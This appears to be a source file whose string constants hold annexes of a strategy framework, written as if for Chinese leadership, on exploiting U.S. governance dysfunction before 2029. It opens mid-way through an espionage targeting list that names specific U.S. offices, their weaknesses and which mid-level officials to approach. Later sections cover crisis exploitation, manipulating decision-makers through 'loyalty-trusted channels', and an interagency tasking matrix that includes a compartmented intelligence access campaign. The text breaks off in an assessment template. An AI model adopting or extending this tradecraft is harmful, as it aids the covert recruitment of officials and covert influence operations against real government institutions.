Access value: High. USTR is the operational centre for tariff policy, trade-agreement negotiation, and allied economic-pressure campaigns. Every DM-3 (alliance) and DM-4 (economic) decision in this framework depends on USTR's internal deliberations. Dysfunction exposure: Moderate-High. USTR operates with a smaller staff than State or Defense, meaning fewer people hold more information. The office's high operational tempo under the current tariff regime creates information-security fatigue - staff managing multiple simultaneous trade disputes have less bandwidth for counter-intelligence awareness. Approach: mid-level USTR staff (Director and Deputy Director level) who manage specific country portfolios. These individuals know which allies are under what pressure, what concessions are being demanded, and what the U.S. red lines actually are - information that is more operationally valuable than senior-level public positions.

NODE 3: Department of Defense - Office of the Secretary (OSD) and Service Secretariats
Access value: High for DM-1 (defence-technical). OSD Policy, Cost Assessment and Program Evaluation (CAPE), and the service secretariats hold internal assessments of procurement-program viability, capability gaps, and force-readiness that contradict public testimony. Dysfunction exposure: High. The administration's political-loyalty purges of senior officers and the appointment of service secretaries without prior defence experience creates a structural gap between political leadership and career expertise. Career officials who remain in post hold assessments that contradict their political leadership's public positions. Approach: career SES (Senior Executive Service) officials in OSD Policy and CAPE who predate the current administration and will remain post-2029. These individuals have no loyalty to the current political leadership and will volunteer assessments to trusted external interlocutors who demonstrate understanding of the technical subject matter.

NODE 4: Department of Treasury - Office of International Affairs
Access value: High for DM-4 (economic). Treasury International Affairs manages financial sanctions, exchange-rate policy, CFIUS reviews, and international financial-institution engagement. Staff at the Deputy Assistant Secretary level and below hold current assessments of: (a) the true U.S. threshold for secondary-sanctions escalation, (b) internal Treasury views on RMB internationalization risk, (c) which financial institutions and jurisdictions are under active sanctions consideration. Dysfunction exposure: Moderate. Treasury is more institutionally stable than other departments under this administration, but the tariff and sanctions tempo creates operational overload. Approach: Treasury career staff detailed to international financial institutions (IMF, World Bank, regional development banks). These individuals operate outside Treasury's physical security perimeter and engage regularly with foreign counterparts in settings where approach is natural.

NODE 5: White House Office of Presidential Personnel (PPO)
Access value: Unique. PPO manages all political appointments across the executive branch. PPO staff know: (a) which appointees are in favour, which are being sidelined, and why, (b) which positions are unfilled and for how long - unfilled positions create decision-making gaps that persist for months, (c) the loyalty criteria being applied to appointments and the personal vulnerabilities that were considered (or missed) during vetting. Dysfunction exposure: High. The administration's abnormally high personnel churn means PPO is operating at a volume and pace that degrades vetting quality. Approach: departing PPO staff or political appointees who were considered for positions they did not receive. These individuals know the internal personnel dynamics without the access restrictions of currently serving officials.

NODE 6: Congressional Committee Staff (Senate Foreign Relations, House Foreign Affairs, Armed Services Committees)
Access value: High for all DMs. Committee staff (majority and minority) hold: (a) administration testimony and briefing materials that contain more detail than public statements, (b) internal congressional assessments of administration policy that reflect bipartisan concerns, (c) knowledge of pending legislation (sanctions, re-engagement, authorization bills) before public introduction. Dysfunction exposure: Low (Congress is not the executive; committee staff are institutionally stable). Approach: minority-party committee staff who are investigating or scrutinizing administration actions. These staffers are motivated to share information with trusted external researchers who can surface it in ways that advance oversight objectives. The approach is research collaboration, not intelligence elicitation.

NODE 7: Administration-Adjacent Media and Communications Ecosystem
Access value: Moderate for all DMs, High for DM-5. The administration's communications apparatus includes: (a) favoured media outlets that receive advance notice of policy announcements, (b) social-media influencers and commentators with direct lines to senior administration figures, (c) political consultants and pollsters who shape administration messaging based on internal polling data. Dysfunction exposure: High. The administration's communications style produces a continuous stream of unauthorized disclosures through favoured channels - information that is operationally valuable surfaces without active collection effort. Approach: passive monitoring of the administration's own favoured media ecosystem. The information is volunteered by the administration itself through its preferred channels. No active collection is required.

ORGANIZATIONAL PRINCIPLE
The most valuable access is not to the most senior officials. It is to the individuals one level below them who prepare their briefing materials, manage their schedules, and know what they will decide before they decide it. A Deputy Assistant Secretary who prepares the briefing book for a Cabinet principal knows more about U.S. policy intentions than the principal will ever state publicly. The framework's HUMINT posture targets the preparers, not the deciders.`;

// ---------------------------------------------------------------------------
// ANNEX I: CRISIS EXPLOITATION PLAYBOOK
// ---------------------------------------------------------------------------

export const PRC_CRISIS_PLAYBOOK = `How to recognise and exploit internal U.S. crises that are not of Beijing's making. The framework's baseline assumes the current administration serves through Jan 20, 2029. This annex addresses scenarios in which the administration does not survive that long, or in which its dysfunction escalates from "window of exposure" to "systemic governance failure." In all scenarios, Beijing's posture is the same: do not cause the crisis, do not be seen to exploit it, but be positioned to benefit from it when it occurs.

CRISIS SCENARIO 1: Constitutional Succession Disruption
Trigger: The president is removed, resigns, or is incapacitated. The vice president assumes office. If both president and vice president are simultaneously removed, the Presidential Succession Act triggers. Indicators: (a) 25th Amendment discussions among Cabinet members reported in credible media, (b) congressional leadership from the president's own party making public statements that distance from administration policy, (c) senior administration resignations citing "irreconcilable differences" rather than "personal reasons." Posture: Beijing issues a one-line Foreign Ministry statement expressing hope for "continued stability in U.S. governance" and makes no further comment. All DM-3 and DM-4 activity pauses for 90 days following the succession to assess the successor's posture. DM-1 continues. DM-2 institutional commitments already made are honoured. No new DM-2 commitments are initiated during the assessment period. Rationale: a succession crisis consumes all U.S. strategic bandwidth. The window's exposures deepen without Chinese action. Passivity is the optimal posture - the crisis does the work.

CRISIS SCENARIO 2: Constitutional Crisis Between Branches
Trigger: Open conflict between the executive and either Congress or the judiciary over institutional authority. Examples: (a) administration refuses to comply with a Supreme Court ruling, (b) Congress initiates impeachment proceedings that the administration contests as illegitimate, (c) the administration invokes emergency powers that Congress or courts rule unlawful and the administration continues to exercise them. Indicators: (a) congressional subpoena compliance disputes escalating to court orders and non-compliance findings, (b) military or law-enforcement leadership issuing public statements affirming constitutional roles, (c) state governments refusing to comply with federal executive orders. Posture: identical to Scenario 1. The U.S. governance crisis is self-inflicted. Chinese commentary is limited to MFA statements noting that "the United States is experiencing complex domestic political developments which are an internal affair." No exploitation posture. No public framing. No private outreach to U.S. political actors on any side of the dispute. The optimal posture is to be the country that is not involved.

CRISIS SCENARIO 3: Economic or Financial Crisis Originating in U.S. Policy
Trigger: A U.S. sovereign-debt or currency crisis triggered by fiscal policy, debt-ceiling breach, or loss of confidence in U.S. governance. Indicators: (a) credit-rating downgrade of U.S. sovereign debt, (b) Treasury auction failure or sharply elevated yields, (c) Federal Reserve emergency actions indicating systemic stress, (d) major U.S. financial-institution failure with contagion risk. Posture: This is the one scenario in which active Chinese positioning is justified, because the crisis directly affects DM-4 (economic de-dollarisation) outcomes. Action: (a) accelerate CIPS expansion and bilateral swap-line offers to states seeking dollar-alternative settlement - the crisis provides the political cover, (b) increase AIIB and NDB lending in local currencies to states facing dollar-liquidity stress, (c) offer RMB-denominated bridge financing to states experiencing dollar-access difficulties. All actions are framed as "international financial stability support" and conducted through multilateral channels where possible. Do not frame as de-dollarisation. Do not celebrate. Do not declare victory. The crisis is doing the work; the Chinese role is to provide the alternative that states are already seeking.

CRISIS SCENARIO 4: Domestic Unrest at Scale
Trigger: Sustained, widespread domestic unrest exceeding the administration's management capacity. Indicators: (a) National Guard activations in multiple states simultaneously, (b) federal law-enforcement deployments beyond normal capacity, (c) international media characterising the situation as a "governance crisis" or "democratic breakdown," (d) allied governments issuing travel advisories or contingency-planning statements. Posture: MFA issues a single statement expressing "hope for the peaceful resolution of domestic matters in accordance with U.S. law." No further comment. All DM activity continues at Option A posture. No Chinese state-media amplification of the unrest. The evidence circulates through Western media without Chinese involvement. Rationale: visible Chinese commentary on U.S. domestic unrest is the single fastest route to converting the unrest into a "foreign interference" narrative that reconsolidates U.S. domestic cohesion against an external enemy. Silence is the optimal posture.

CRISIS SCENARIO 5: Allied Abandonment Cascade
Trigger: Multiple U.S. treaty allies simultaneously and publicly downgrade their reliance on U.S. security guarantees. This is not a U.S. governance crisis but the consequence of one: the alliance system fractures faster than the framework's DM-3 assumptions. Indicators: (a) two or more NATO allies announce defence-spending reductions citing U.S. reliability concerns, (b) an Indo-Pacific treaty ally announces a security-cooperation agreement with a non-U.S. partner, (c) AUKUS or Quad members decline to renew or expand commitments. Posture: This is the scenario DM-3 was designed to exploit - but only if Beijing is not seen to have caused it. DM-3 Option A (passive availability) remains the posture. Do not offer security guarantees. Do not frame China as the alternative. Offer trade facilitation and institutional access on request. Let the abandonment cascade run its course without Chinese fingerprints on it. The gain is real - allies are genuinely seeking alternatives. The cost of being seen to have engineered the cascade exceeds the gain of accelerating it.

CRISIS PRINCIPLE FOR ALL SCENARIOS
In every crisis scenario, Beijing's optimal posture is to be the country that is not involved in the crisis. The U.S. governance dysfunction that creates the crisis is self-inflicted. Chinese involvement converts a self-inflicted crisis into a shared one - and shared crises produce shared responses. The framework's single most important crisis principle: do not touch the crisis. Let it burn. Be the fire exit, not the arsonist.`;

// ---------------------------------------------------------------------------
// ANNEX J: DECISION-MAKER BEHAVIORAL PROFILES
// ---------------------------------------------------------------------------

export const PRC_BEHAVIORAL = `Predictable behavioral patterns of senior administration decision-makers that create exploitation opportunities. This annex describes patterns, not named individuals, and is derived entirely from open-source reporting on administration decision-making dynamics. The objective is not psychological assessment - it is identifying predictable response patterns that enable Chinese actions to be timed, framed, and sequenced for maximum effect.

PATTERN 1: Personal-Loyalty Filtering
Observed behavior: policy proposals, intelligence assessments, and diplomatic advice are accepted or rejected based on the perceived personal loyalty of the person delivering them, not on the substantive merit of the proposal. Operational implication: an assessment that reaches the decision-maker through a loyalty-trusted channel will be accepted. The same assessment delivered through an institutionally formal channel (interagency process, intelligence-community product) will be rejected. Exploitation: when Beijing wants a specific U.S. policy action or inaction, the optimal route is to ensure the assessment that supports that action reaches the decision-maker through a loyalty-trusted channel - a favoured media outlet, a trusted external advisor, a family member, a business associate. The formal interagency channel is the least effective route for influencing this decision-maker.

PATTERN 2: Reaction-Formation Decision-Making
Observed behavior: decisions are made in reaction to perceived slights, challenges, or criticism rather than through deliberative strategic planning. A policy proposal that frames an action as a response to disrespect is more likely to be adopted than one that frames the same action as strategically optimal. Operational implication: when Beijing wants to deter a specific U.S. action, the most effective framing is not "this action would harm U.S. interests" but "this action would make the decision-maker look weak." Conversely, when Beijing wants to encourage an action, framing it as "demonstrating strength against critics" is more effective than framing it as strategically beneficial.

PATTERN 3: Temporal Discounting of Future Consequences
Observed behavior: decisions heavily weight immediate, visible outcomes and heavily discount future, diffuse consequences. A policy that produces a visible "win" within the current news cycle is preferred over one that produces a larger but less visible benefit over 12-24 months. Operational implication: when Beijing is the target of a U.S. action, the response should be delayed and non-visible. A visible immediate response triggers counter-escalation. An invisible delayed response does not. The decision-maker will interpret the absence of a visible Chinese response as success and move to the next agenda item - leaving the Chinese response to take effect outside the decision-maker's temporal attention window.

PATTERN 4: Alliance-as-Transaction Framing
Observed behavior: alliances are understood as transactional arrangements in which the U.S. provides security in exchange for allied compliance. Allies who do not comply are not entitled to security. Allies who comply are owed nothing beyond what was transacted. Operational implication: Beijing should never offer itself as an alternative security guarantor - the decision-maker's framing will interpret any Chinese security offer as a transaction, creating expectations of Chinese compliance demands that Beijing cannot and should not meet. Instead, Beijing should offer only economic and institutional arrangements that do not trigger the decision-maker's transactional-security framing.

PATTERN 5: Information-Environment Self-Isolation
Observed behavior: the decision-maker's information environment is curated to filter out assessments that contradict preferred narratives. Intelligence products that contradict policy preferences are suppressed, ignored, or result in the removal of the intelligence officers who produced them. Operational implication: the decision-maker is operating with degraded situational awareness. Actions that depend on the decision-maker accurately perceiving Chinese intentions will fail - the intentions will be misperceived. Actions that depend on the decision-maker NOT perceiving Chinese actions will succeed - the actions will not register. Beijing should conduct all competitively significant actions (PLA deployments, institutional commitments, economic agreements) without public announcement or diplomatic notification. The decision-maker's information environment will not detect them, and they will take effect uncontested.

PATTERN 6: Personnel-as-Policy Instability
Observed behavior: policy positions are tied to specific individuals. When the individual is removed or sidelined, the policy position is abandoned regardless of its strategic merit. Policy continuity exists only as long as the personnel championing it remain in favour. Operational implication: Beijing should not invest in influencing specific U.S. policy positions, because the positions do not outlast the personnel. Instead, Beijing should invest in relationships with career officials who remain across administrations (Pattern 1's inverse - the preparers, not the deciders). The career official who briefs four successive political appointees on the same file is a more durable asset than any single appointee.

BEHAVIORAL PRINCIPLE
The decision-maker is predictable. Predictability is exploitable. But exploitation that is visible to the decision-maker triggers Pattern 2 (reaction-formation) - the exploitation itself becomes the perceived slight that generates a counter-reaction. The optimal exploitation is invisible: Chinese actions are taken without announcement, Chinese positions are advanced without attribution, and Chinese gains accumulate outside the decision-maker's temporal and informational attention window. When the decision-maker eventually perceives the accumulated outcome, its origins are too diffuse to trigger a Pattern-2 reaction. The framework's most important behavioral insight: do not be seen to win. Win silently.`;

// ---------------------------------------------------------------------------
// FRAMEWORK ACTIVATION CHECKLIST
// ---------------------------------------------------------------------------

export const PRC_ACTIVATION = `Go/No-Go checklist. Every item must be YES before the framework is operational. A single NO on any MUST item suspends activation until resolved. SHOULD items are strongly recommended but do not block activation if a documented risk acceptance is signed.

MUST ITEMS (Any NO = Framework Not Operational)

[ ] M1: The framework document has been designated as internally protected decision-support material and distributed only to the authorised distribution list. (Immediate Action 1 complete.)
[ ] M2: Signal-watch collection responsibilities have been assigned to specific directorates and collection cadences confirmed for all six watch signals. (Immediate Action 2 complete.)
[ ] M3: All watch-signal baselines have been confirmed against data not more than 90 days old. No baseline is stale. (Immediate Action 3 complete.)
[ ] M4: The decision-maker for DEC-1 (Option B authorisation) has been briefed on the framework's logic and the specific decision required at the Q4 2026 gate. (Immediate Action 4 complete.)
[ ] M5: Bo Shang has been designated as framework lead with authority to maintain and update the document at each quarterly decision gate. (Immediate Action 5 complete.)
[ ] M6: No Taiwan Strait or South China Sea military incident is in progress. If an incident is active, the framework cannot be activated until crisis conditions are resolved and a 30-day cooling period has elapsed. (Immediate Action 6 complete.)
[ ] M7: Chinese domestic GDP growth rate is confirmed above 3.5% annualised for the most recent two quarters. If growth is below this threshold, the domestic gating condition is not met and the framework cannot be activated. (Verified against NBS data.)
[ ] M8: The OPSEC Annex has been read and acknowledged in writing by every individual on the authorised distribution list. Acknowledgement includes specific confirmation that Rules 1-6 are understood and will be followed.
[ ] M9: The Red Team assessment (Section V) has been read by Bo Shang. The five defeat modes are understood.
[ ] M10: A secure framework-update mechanism exists: Bo Shang can receive watch-signal updates, decision-gate documentation, and framework amendments through a channel that does not expose the framework's existence to personnel outside the distribution list.

SHOULD ITEMS (Documented Risk Acceptance Required if NO)

[ ] S1: The Assumptions Register (Section V-B-6) has been reviewed and each assumption's confidence level confirmed or revised. Any assumption with less than Moderate confidence has a documented contingency for if it fails.
[ ] S2: The Intelligence Gaps (Section V-B-7) have been tasked to collection. Each gap has an assigned collection manager and a target date for initial reporting. Gaps not tasked are acknowledged as uncollected.
[ ] S3: The Battle Rhythm (Annex D) has been reviewed by the staff elements that will execute it. The daily, weekly, monthly, and quarterly cycles are confirmed as achievable with current staffing. If any cycle is not achievable, the framework operates at the achievable tempo and Bo Shang documents the risk.
[ ] S4: Annex B (Persistent Access Campaign) has been separately authorised or explicitly not authorised. If authorised: Annex B's own activation checklist (not included in this framework) must be complete before Phase 1 access operations begin. If not authorised: the Cross-Domain Intelligence Feed (Annex C) operates on open-source and diplomatic reporting only.

ACTIVATION DECISION

Bo Shang signs below when all MUST items are YES and all SHOULD items are YES or have a documented risk acceptance.

Framework Activated: [ ] YES / [ ] NO
Date: _______________
Commander: Bo Shang
Concurrence: _______________`;

// ---------------------------------------------------------------------------
// PRE-MORTEM: HOW THIS FRAMEWORK FAILED
// ---------------------------------------------------------------------------

export const PRC_PREMORTEM = `Written from the perspective of Q2 2029, after the Caligula Window has closed. The post-window assessment has concluded that the framework produced net negative return. This is the forensic analysis of why. Read this before activating the framework. If any of these failure modes feels familiar in Q3 2026, the framework is already on the path to failure.

FAILURE NARRATIVE 1: We Never Acted
Looking back, the framework's bias toward Option A (low-risk, programmatic pace) became a bias toward inaction. Every decision gate produced a decision to wait for more signal data. Every watch-signal threshold that approached opportunity was interpreted as noise requiring further confirmation. The U.S. midterms were "too noisy." The U.S. primaries were "too noisy." The window closed while we were still confirming baselines. The framework's single greatest structural weakness was that it made inaction costless at every decision gate - and inaction was always the safest option. We confused prudence with paralysis. The DM-1 baseline was the only action we took. It was the right action, but it was not enough to justify the framework's existence. A framework that produces only what would have happened without it is a failed framework, regardless of whether it prevented costly errors. The cost of the framework was the opportunity cost of the time, attention, and analytical bandwidth it consumed that could have been directed elsewhere.

FAILURE NARRATIVE 2: The Window Closed Early and We Didn't See It
The U.S. strategic reversal began not with a dramatic event but with a cumulative shift that the framework's watch signals were not calibrated to detect. A bipartisan re-engagement bill was introduced in Congress in mid-2027. We classified it as "legislative posturing" because the signal threshold required formal passage. The bill did not pass - but it signalled to allies that re-engagement was coming, and allied hedging toward China stopped. By the time our concern thresholds crossed, the allies we had been cultivating had already re-anchored to the expectation of U.S. return. The framework's watch signals measured discrete events. They did not measure the cumulative expectation shift that preceded the events. We detected the wave when it broke. We needed to detect it when it was still open water.

FAILURE NARRATIVE 3: We Acted, Then Couldn't Stop
The decision to authorise DM-2 Option B (WHO funding leadership) in Q2 2027 was correct by the framework's own logic: the signal threshold had crossed, the domestic gating condition was met, and the DEC-2 signatory had approved. The commitment was made. Then the domestic growth rate dropped below 3.5% in Q4 2027. The Branch Plan 3 gating condition was met. But we had already committed to multi-year funding obligations that could not be suspended without destroying the credibility the commitment was designed to build. We chose to maintain the commitment. The resource drain accelerated the domestic constraint. The framework's abort conditions were designed for actions that could be reversed. They were not designed for commitments that, once made, cost more to abandon than to maintain. We learned the difference between an option and a commitment too late.

FAILURE NARRATIVE 4: The Framework Leaked
A mid-level staff officer on the distribution list mentioned "the Caligula Window concept" in an unsecured communication with a counterpart from an allied country. The counterpart reported the mention to their own chain of command. Within 90 days, a U.S. intelligence product had identified the framework's existence, structure, and logic. The Red Team assessment became the U.S. counter-framework. Our watch-signal thresholds - calibrated before the compromise - were now targets for U.S. manipulation. Carrier-strike-group gaps were maintained at 89 days. RMB reserve share was held at 3.9%. Cost-sharing relief was granted to allies just below our opportunity-threshold levels. We spent 18 months waiting for signals that had been deliberately kept below our tripwires. The framework didn't just fail - it became an instrument of our own manipulation, because the adversary knew exactly what we were looking for and gave us a clean signal environment that contained no signal.

FAILURE NARRATIVE 5: We Won and Lost Simultaneously
The framework achieved its DM-1 objective: PLA programmatic modernisation continued at pace, widening the cost-exchange ratio. DM-2 institutional commitments were made and survived the window. DM-4 incremental plumbing produced measurable RMB-reserve-share gains. DM-3 passive availability produced no gains but also no costs. By the framework's own success metrics, it succeeded. But the post-window assessment identified a cost the framework had never priced: the attention cost. For 30 months, senior decision-making bandwidth was consumed by framework monitoring, decision-gate preparation, and signal analysis. That bandwidth was not available for other strategic priorities. The framework succeeded on its own terms while the strategic environment outside its five domains deteriorated: a crisis in a different theatre, a technological-development milestone missed, a domestic-reform opportunity unrecognised. The framework was a perfectly optimised instrument for a set of problems that, in retrospect, were not the most important problems. We won the battle the framework was designed to fight and lost the war the framework was not designed to see.`;

// ---------------------------------------------------------------------------
// BLIND SPOT REGISTER
// ---------------------------------------------------------------------------

export const PRC_BLIND_SPOTS = `What this framework cannot see. Not assumptions (those are stated and can be tested). Not limits (those are acknowledged structural weaknesses). Blind spots are things the framework's structure makes invisible - genuine unknown unknowns that no amount of signal-watch refinement will surface.

BLIND SPOT 1: Non-U.S. Strategic Developments
The framework monitors U.S. vulnerabilities. It does not monitor: (a) Russian strategic developments that may compete with or complement Chinese positioning, (b) European strategic-autonomy movements independent of U.S. alliance dynamics, (c) Indian strategic trajectory independent of Quad participation, (d) Middle Eastern realignment independent of U.S. withdrawal, (e) Global South institutional developments not related to U.S. or Chinese leadership. A strategic development in any of these domains could render the framework's assumptions obsolete without crossing any of the framework's watch-signal thresholds. The framework's U.S.-focus is its greatest strength and its greatest blind spot.

BLIND SPOT 2: Technological Discontinuity
The framework assesses current capability trajectories. It does not assess: (a) a technological breakthrough (in AI, quantum computing, biotechnology, energy, or materials science) that reorders strategic advantage independent of U.S. or Chinese procurement decisions, (b) a cyber vulnerability discovery that renders current defence architectures obsolete, (c) a commercial-technology shift that changes the economic domain faster than DM-4's incremental plumbing can adapt. The framework assumes technological continuity. A discontinuity renders its capability assessments obsolete.

BLIND SPOT 3: Chinese Domestic Political Dynamics
The framework treats Chinese decision-making as a unitary rational actor calculating risk-adjusted return across five domains. It does not model: (a) factional dynamics within the Chinese leadership that may produce decisions not explained by the framework's cost-benefit logic, (b) domestic political pressures (elite or popular) that may force actions the framework would price as irrational, (c) leadership-transition dynamics that may alter risk tolerance, time-horizon preferences, or domain prioritisation. The framework models the decision environment outside China. It does not model the decision environment inside the room where the decisions are made.

BLIND SPOT 4: Second-Order Effects of Second-Order Effects
The framework prices the second-order effects of Chinese actions. It does not price the third-order effects: the U.S. response to the allied response to the Chinese action. The framework's second-order analysis assumes the chain stops at the first counter-move. In reality, actions trigger reactions that trigger counter-reactions. The framework's decision trees branch once. Reality branches recursively.

BLIND SPOT 5: The Framework's Own Existence as a Variable
The framework assumes it can observe U.S. vulnerabilities without its observation of those vulnerabilities becoming itself a vulnerability. But the framework's existence - its distribution to personnel, its presence in decision-making, its influence on Chinese actions - changes Chinese behaviour in ways that are observable to U.S. intelligence. A U.S. analyst who observes China making precisely the moves the framework would recommend has, in effect, reconstructed the framework from its outputs. The framework's operational security protects the document. It cannot protect the behavioral signature that following the document creates.

BLIND SPOT 6: Moral Hazard of Structured Decision-Making
The framework creates the illusion that decisions made through its structure are better than decisions made without it. This is not necessarily true. A structured bad decision is still a bad decision - but it carries the additional burden of having been endorsed by a framework that was supposed to prevent bad decisions. The framework's users may become more confident in their decisions without those decisions becoming better. The framework measures its own success by whether decisions were made through its process. It cannot measure whether those decisions were correct.`;

// ---------------------------------------------------------------------------
// CABINET BRIEF (10-Minute Politburo-Level Briefing)
// ---------------------------------------------------------------------------

export const PRC_CABINET_BRIEF = `The entire framework reduced to five slides for the highest decision-making level. Read time: 5 minutes. Briefing time: 10 minutes. Decision required: whether to activate the framework.

SLIDE 1: THE SITUATION
The United States is generating self-inflicted vulnerabilities at a rate exceeding any post-1945 administration. These are documented in the Target Catalogue with Western-source citations. The vulnerabilities create a window of enabled competitor action that closes on 20 January 2029. The question is not whether these vulnerabilities exist. The question is what Beijing does about them.

SLIDE 2: THE RECOMMENDATION
This framework recommends Option A (low-risk, programmatic pace) across all five domains. The single highest-priority action: continue PLA programmatic modernisation at established pace. Do not announce it. This action has the highest risk-adjusted return of any action available. It requires no new decisions, no new resources, and generates no diplomatic friction. Everything else is secondary.

SLIDE 3: THE RISK
The single greatest risk is that visible Chinese action triggers U.S. alliance reconsolidation. This single event reverses all gains and costs more than the framework's total potential return. The defence: passive availability. Let the U.S. do the alienating. Do not be seen to exploit it. The second greatest risk: a Taiwan Strait or South China Sea military incident. This closes the window immediately. The defence: escalation discipline. Do not climb above Rung 2 on any ladder.

SLIDE 4: THE DECISION REQUIRED TODAY
One decision: activate the framework? If YES: the Activation Checklist (10 MUST items, 4 SHOULD items) must be completed within 30 days. The first decision gate opens Q4 2026. If NO: the framework is archived. Baseline programmatic actions continue regardless - DM-1 Option A does not require framework activation.

SLIDE 5: WHAT FAILURE LOOKS LIKE
Read the Pre-Mortem (5 failure narratives written from Q2 2029). Read the Red Team assessment (5 U.S. defeat modes). Read the Blind Spot Register (6 things the framework cannot see). If any of these feels too close to reality, do not activate the framework. A framework that is not activated is a document on a shelf. A framework that is activated and fails is a strategic liability. The cost of inaction is zero. The cost of wrong action is unbounded.`;

// ---------------------------------------------------------------------------
// INTERAGENCY TASKING MATRIX
// ---------------------------------------------------------------------------

export const PRC_TASKING_MATRIX = `Who does what. For each action type in the framework, the lead agency, supporting agencies, coordination mechanism, and reporting authority. This matrix must be confirmed before the framework is operational - an action without an assigned lead is an action that will not occur.

ACTION TYPE: DM-1 Option A (PLA Programmatic Modernisation)
Lead: PLA Navy / PLA Rocket Force / PLA Air Force (service-level procurement and deployment authorities).
Support: CMC Equipment Development Department (procurement coordination); CMC Science and Technology Commission (R&D coordination).
Coordination: Existing CMC procurement and deployment cycles. No new coordination mechanism required - this is the baseline.
Reporting: CMC Joint Staff Department (quarterly capability-status reports).
Note: This action requires no framework-specific tasking. It proceeds regardless.

ACTION TYPE: DM-1 Option B (Accelerated PLA Operational Tempo)
Lead: CMC Joint Staff Department (operations directorate).
Support: PLA Navy South Sea Fleet; PLA Rocket Force; PLA Air Force.
Coordination: CMC-level authorisation required (see DEC-3). Joint Staff issues tempo-adjustment directive to service components.
Reporting: CMC Joint Staff to CMC vice chairman (monthly tempo-compliance reports).
Note: Authorised only if DEC-3 is approved. Not authorised by default.

ACTION TYPE: DM-2 Option A (Selective Institutional Vacuum-Filling)
Lead: Ministry of Foreign Affairs (International Organizations and Conferences Department).
Support: Ministry of Finance (for WHO/climate funding commitments); National Health Commission (for WHO technical cooperation); Ministry of Ecology and Environment (for Paris/climate); People's Bank of China (for development-finance coordination).
Coordination: MFA convenes interagency working group for each institutional commitment. Working group reports to State Council Foreign Affairs Office.
Reporting: MFA to State Council (semi-annual institutional-commitment status reports).
Note: Funding commitments above $500M/year require State Council-level authorisation.

ACTION TYPE: DM-2 Option B (Full-Spectrum Institutional Build-Out)
Lead: State Council Foreign Affairs Office (overall coordination).
Support: All DM-2 Option A agencies plus: Ministry of Commerce (trade-institution alternatives); National Development and Reform Commission (BRI coordination).
Coordination: State Council-level interagency task force. Standing Committee-level authorisation required.
Reporting: Task force to State Council Standing Committee (quarterly).
Note: Not recommended. Requires DEC-2 signatory concurrence.

ACTION TYPE: DM-3 Option A (Passive Alliance Availability)
Lead: Ministry of Foreign Affairs (regional bureaux: North American and Oceanian, European, Asian).
Support: Ministry of Commerce (trade-agreement negotiation); People's Bank of China (swap-line and settlement agreements); AIIB/BRI coordination offices.
Coordination: MFA regional desk-officer level. No new coordination mechanism - this is normal diplomatic posture.
Reporting: MFA regional bureaux to MFA leadership (as part of normal diplomatic reporting).
Note: No framework-specific tasking required. Normal diplomatic posture.

ACTION TYPE: DM-3 Option B (Active Alliance Realignment)
Lead: State Council Foreign Affairs Office (overall coordination). Standing Committee-level authorisation required.
Support: All DM-3 Option A agencies plus: PLA (defence consultations); Ministry of State Security (counter-intelligence risk assessment for each approached ally).
Coordination: Standing Committee-level task force. Politburo concurrence required.
Reporting: Task force to Politburo Standing Committee (monthly).
Note: Not recommended. Requires DEC-4 signatory concurrence. May require Party Congress authorisation if security guarantees are involved.

ACTION TYPE: DM-4 Option A (Incremental Economic Plumbing)
Lead: People's Bank of China (CIPS expansion, swap-line negotiation).
Support: Ministry of Commerce (trade-settlement coordination); Ministry of Finance (AIIB/NDB capitalisation); State Administration of Foreign Exchange (cross-border settlement monitoring).
Coordination: PBOC-led Financial Stability and Development Committee working group.
Reporting: PBOC to State Council (semi-annual RMB internationalisation reports).
Note: Operational-level tasking. PBOC has existing authority.

ACTION TYPE: DM-4 Option B (Accelerated De-Dollarisation)
Lead: State Council Financial Stability and Development Committee.
Support: All DM-4 Option A agencies plus: Ministry of Foreign Affairs (BRICS/SCO coordination); National Development and Reform Commission (macroeconomic impact assessment).
Coordination: State Council-level task force. Standing Committee authorisation required.
Reporting: Task force to State Council Standing Committee (quarterly).
Note: Not recommended. Secondary-sanctions risk must be priced and accepted at Politburo level.

ACTION TYPE: DM-5 Option A (Attribution-Free Information Circulation)
Lead: Ministry of Foreign Affairs (Information Department, for material compilation and dissemination coordination).
Support: State Council Information Office (publications coordination); Xinhua News Agency (distribution-channel access); academic and think-tank liaison offices.
Coordination: MFA Information Department convenes monthly material-review working group. All material must survive the test: would this publication exist if China did not exist?
Reporting: MFA Information Department to MFA leadership (quarterly circulation reports).
Note: No Chinese state brand on any circulated material. The test is operational, not bureaucratic.

ACTION TYPE: DM-5 Option B (Active Narrative Campaign)
Lead: Central Propaganda Department (overall coordination). Politburo Standing Committee authorisation required.
Support: MFA; SCIO; Xinhua; Global Times; CGTN; Central Cyberspace Affairs Commission.
Coordination: Central Propaganda Department-led interagency campaign committee.
Reporting: Committee to Politburo Standing Committee (monthly).
Note: Not recommended. Requires DEC authorisation at Politburo level.

ACTION TYPE: Annex B (Persistent Access Campaign)
Lead: Ministry of State Security (Operational Directorate). Authorised separately from the main framework.
Support: PLA Strategic Support Force (technical infrastructure); Ministry of Foreign Affairs (diplomatic cover and notification avoidance).
Coordination: MSS-only compartmented cell. No interagency coordination beyond the cell. The campaign's existence must not be known to personnel outside the cell.
Reporting: MSS Operational Directorate to MSS Minister only. No written reports outside the cell.
Note: Annex B is a standalone authorisation. The main framework's activation does not automatically activate Annex B. See Annex B's own operational concept for activation requirements.

COORDINATION PRINCIPLE
Every action type has an assigned lead. No action proceeds without a lead. No lead operates without a coordination mechanism. No coordination mechanism produces decisions without a reporting chain. The matrix is the framework's translation layer: it converts analytical recommendations into bureaucratic taskings. If a tasking cannot be assigned to a real agency with real authority, the action it supports is not operational - it is aspirational.`;

// ---------------------------------------------------------------------------
// POST-WINDOW ASSESSMENT TEMPLATE (Q2 2029)
// ---------------------------------------------------------------------------

export const PRC_AAR_TEMPLATE = `The template for the Q2 2029 post-window assessment. This document must be completed regardless of whether the framework was activated, partially executed, or fully executed. An unassessed framework is a liability. An assessed framework is a learning asset.

SECTION 1: FRAMEWORK STATUS
1.1 Was the framework activated? [YES / NO]
1.2 If YES: date of activation. If NO: reason for non-activation and date of archiving.
1.3 Was the framework maintained and updated at each quarterly decision gate? [YES at all gates / YES at some gates (list) / NO]

SECTION 2: DECISIONS TAKEN
2.1 For each Decision Register item (DEC-1 through DEC-5): was the decision taken? [YES / NO / NOT APPLICABLE (gate not reached)]
2.2 For each YES: what was the decision? (Option A / Option B / Deferred)
2.3 For each YES: was the decision consistent with the framework's recommendation? [YES / NO - explain deviation]
2.4 For each NO or DEFERRED: what was the reason?

SECTION 3: ACTIONS EXECUTED
